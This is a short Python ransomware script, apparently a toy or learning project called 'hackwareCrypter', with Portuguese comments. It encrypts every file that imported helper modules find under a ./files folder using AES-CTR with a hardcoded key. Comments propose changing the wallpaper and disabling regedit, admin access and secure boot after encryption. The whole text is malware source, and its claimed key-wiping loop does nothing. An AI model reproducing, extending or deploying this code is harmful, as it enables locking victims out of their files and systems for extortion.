from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import discovery
import crypter


# a senha pode ter os seguintes tamanhos
#128/192/256 bits

HARDCODED_KEY = 'hackware strike force strikes u!'

def get_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypter")
    parser.add_argument('-d','--decrypt', help='decripta os arquivos [default: no]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('Seus arquivos foram criptografados, senha é {}'.format(HARDCODED_KEY))
        key = input('Digite a senha: ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [init_path]

    for currentDir in startDirs:
        for filename in discovery.discover(currentDir):
            crypter.change_files(filename,cryptFn)


    #Limpa a chave de criptografia da memória
    for _ in range(100):
        pass

    if not decrypt:
        # Codigo zueira aqui pq o kara foi encryptado
        pass
        #Após a encriptação, voce pode alterar o wallpaper
        #Alterar os icones, desativar o regedit, admin, bios secure boot, etc


if __name__ == '__main__':
    main()